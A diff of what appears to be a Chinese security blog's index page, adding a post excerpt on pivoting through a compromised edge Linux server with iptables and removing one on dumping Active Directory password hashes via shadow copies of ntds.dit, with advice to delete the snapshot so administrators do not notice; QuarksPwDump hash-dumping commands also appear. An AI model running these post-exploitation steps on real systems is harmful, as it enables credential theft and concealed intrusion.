@@ -139,6 +139,40 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/09/19/iptables-portfward/">
+                通向彼岸 之内网代理转发 [ 系统篇 iptables ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/iptabbles/">iptabbles</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;作用和netsh差不多,这里就不废话了,直接看操作,还是同样的情况,只不过你此时拿下的是边界的一台linux服务器,依然想通过这台机器直接去访问内网的其它机器</p>
+<p>0x02 环境大致如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">边界linux机器(centos <span class="number">6.8</span>en) 		<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.40</span>(假设为目标机器的公网ip) <span class="number">192.168</span>.<span class="number">32.129</span>(假设为目标的内网ip) </div><div class="line">要访问的内网windows机器(win <span class="number">2008</span>r2cn) 	<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">32.134</span> </div><div class="line">攻击者机器(win7cn) 			<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
+<p>0x03 最终目的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过边界的linux机器访问内网中的windows机器上的指定服务</div></pre></td></tr></table></figure></p>
+<p>0x04 具体过程如下,首先,编辑边界linux机器的路由转发配置文件,开启其路由转发功能<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># sed -i '/net.ipv4.ip_forward/ s/\(.*= \).*/\11/' /etc/sysctl.conf</span></div><div class="line"><span class="comment"># cat /etc/sysctl.conf | grep "net.ipv4.ip_forward"</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/19/iptables-portfward/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/09/18/netsh-portfward/">
                 通向彼岸 之内网代理转发 [ 系统篇 netsh ]
             </a>
@@ -773,54 +807,6 @@
 <p><img src="/img/ntdsutil unmount.png" alt=""></p>
 <p>第五步:开始利用QuarksPwDump提取账户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg save hklm\system system.hiv  提取syskey,这里就直接放到当前目录下了,等会儿提取hash要用</div><div class="line">QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file <span class="symbol">c:</span>\ntds.dit --system-file <span class="symbol">c:</span>\system.hiv -o <span class="symbol">c:</span>\pass.txt</div></pre></td></tr></table></figure></p>
 <p><img src="/img/ntdsutil hash.png" alt=""></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/08/13/vssown-vbs-libesedb-NtdsXtract/">
-                完整导出域内用户hash小记 [vssown.vbs + libesedb + NtdsXtract]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-08-13</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/domainhash/">domainhash</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>本地测试环境:<br>&nbsp;&nbsp;&nbsp;&nbsp;域控 2008 r2 64bit</p>
-<p>离线利用linux提取域内所有用户hash,实际测试可行,不过文件确实有点儿大,用于测试的系统域内用户只有十个左右,却已经打了12M[按这样算的话,一千个用户也就将近1G],如果用户量特别大的话,可想而知,不过好在信息非常全:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vssown.vbs + libesedb + NtdsXtract</div></pre></td></tr></table></figure></p>
-<p>查看vssown.vbs帮助:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs</div></pre></td></tr></table></figure></p>
-<p><img src="/img/vssown help.png" alt=""><br></p>
-<p>第一步,启动服务:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /start</div><div class="line">cscript vssown.vbs /status</div></pre></td></tr></table></figure></p>
-<p><img src="/img/vssown start stutas.png" alt=""><br></p>
-<p>第二步,创建快照:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /create C</div><div class="line">cscript vssown.vbs /list</div></pre></td></tr></table></figure></p>
-<p><img src="/img/vssown create list.png" alt=""><br></p>
-<p>第三步,把SYSTEM和ntds.dit文件都复制回本地,如果比较多,下回本地确实有点儿麻烦:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system .</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit .</div></pre></td></tr></table></figure></p>
-<p><img src="/img/vssown copy.png" alt=""><br></p>
-<p>第四步,删除快照,这非常重要,千万不要忘了,不然被管理员看到就不太好了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /delete *</div></pre></td></tr></table></figure></p>
-<p><img src="/img/vssown delete.png" alt=""><br></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /stop</div></pre></td></tr></table></figure>
-<p><img src="/img/vssown stop.png" alt=""><br></p>
-<p>第五步,在本地编译安装好libesedb 和 NTDSXtract,这里我把它俩都放到同级目录中了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./configure</span></div><div class="line"><span class="comment"># make</span></div><div class="line"><span class="comment"># cd esedbtools/</span></div><div class="line"><span class="comment"># ./esedbexport ./ntds.dit   这里我已经把ntds.dit复制到当前目录下了</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/esedbexport.png" alt=""><br></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mv ntds.dit.export/ ../../</span></div><div class="line"><span class="comment"># cd ../../</span></div><div class="line"><span class="comment"># cd NTDSXtract\ 1.0/</span></div><div class="line"><span class="comment"># python dsusers.py  ../ntds.dit.export/datatable.3  ../ntds.dit.export/link_table.5 --passwordhashes '/root/SYSTEM' 这里的SYSTEM文件最好给绝对路径</span></div></pre></td></tr></table></figure>
-<p><img src="/img/vssown hash.png" alt=""><br><br><img src="/img/vssown krbtgt.png" alt=""><br></p>
 
         </div>
     
